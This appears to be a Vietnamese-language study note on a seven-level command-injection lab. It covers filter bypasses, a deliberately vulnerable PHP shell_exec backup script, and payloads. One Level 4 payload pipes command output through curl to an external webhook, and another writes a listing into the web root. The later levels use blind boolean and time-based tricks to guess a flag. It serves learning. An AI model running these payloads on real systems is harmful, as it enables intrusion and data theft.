
### Level 1
![[Pasted image 20250525151805.png]]

![[Pasted image 20250525151827.png]]

+ `$target` là untrusted data => chèn thêm dạng `; <lệnh>` sẽ chèn được thêm lệnh vào hàm shell_exec


### Level 2

![[Pasted image 20250525151934.png]]

+ Né dấu `;` thì tao dùng dấu `&` và dấu `|`


### Level 3

![[Pasted image 20250525152026.png]]

+ Né 3 dấu kia, ta sử dụng dấu xuống dòng trong dạng mã ASCII là `%0a`
CÁCH 2 : Lợi dụng việc in log của lệnh dig sẽ in ra kết quả input của người nhập.
=> Ta chỉ cần có output của lệnh ls rồi cho vào lệnh dig thì nó sẽ in ra kqua của lệnh ls ra màn hình
+ Sử dụng ``(backstick) hoặc $() để chèn lệnh ls vào làm input của lệnh dig
### Level 4

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
            case "backup":
	     $result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");

                if ($result !== null && strpos($result, "zip error") === false)

                    die("Backup thành công");

                else

                    die("Backup không thành công");

                break;

            // CHANGELOG: Bảo trì

            // case "ping":

            //  $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");

            //  break;

            // case "nslookup":

            //  $result = shell_exec("timeout 10 nslookup $target 2>&1");

            //  break;  

            // case "dig":

            //  $result = shell_exec("timeout 10 dig $target 2>&1");

            //  break;

        }

        die("Một số chức năng đang được bảo trì. Mời bạn nạp tiền để có thể tiếp tục duy trì dự án");

    }

?>
```


+ Không còn filter các dấu ; & | nữa nhưng code không in ra màn hình kết quả của lệnh chạy được mà chỉ in ra Backup thành công hay không
=> Phải tìm cách xem kết quả bằng cách nào đó => ném kết quả ra 1 server bên ngoài bằng lệnh curl
=> Dùng webhook để bắt gói tin
`curl -d @<đường dẫn file> <url của server muốn gửi tới>`
Payload: `; ls | curl --data-binary @-;`
Ở đây ta sẽ lưu kết quả của lệnh vào 1 file và gửi file đó tới webhook(hoặc server nào đó) bằng lệnh curl


### Level 5

+ Giống level 4 nhưng không được bắn ra ngoài internet
+ Payload : `;echo `ls -la` > /var/www/html/check.txt;` bắn ra document root rồi đọc

### Level 6

+ Giống level 5 nhưng không cho quyền ghi nữa
+ Tận dụng việc check tên output có từ `zip error` thì sẽ trả về `Backup không thành công` => Có thể check 1 điều kiện logic bằng câu lệnh if và đưa ra `zip error` nếu sai => Brute-force để đoán flag và tận dụng việc check ra `Back up thành công` để dò.

### Level 7

+ Giống level 6 nhưng không chia 2 luồng đúng/sai nữa mà chỉ luôn in ra `Đã chạy câu lệnh backup`
![[Pasted image 20250527175403.png]]

+ Sử dụng TIME-BASED BLIND để phân biệt đúng sai